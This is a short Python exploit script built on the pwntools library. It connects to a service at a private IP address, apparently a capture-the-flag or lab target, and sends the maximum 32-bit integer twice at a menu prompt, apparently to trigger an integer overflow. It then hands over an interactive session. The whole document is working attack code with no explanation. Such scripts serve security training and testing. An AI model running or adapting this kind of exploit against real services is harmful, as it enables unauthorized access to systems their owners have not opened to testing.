from pwn import *
p = remote('10.10.7.194', 9005)
p.recv()
for i in range(2):
    p.sendlineafter(b']>> ', b'2147483647')
p.recv()
p.interactive()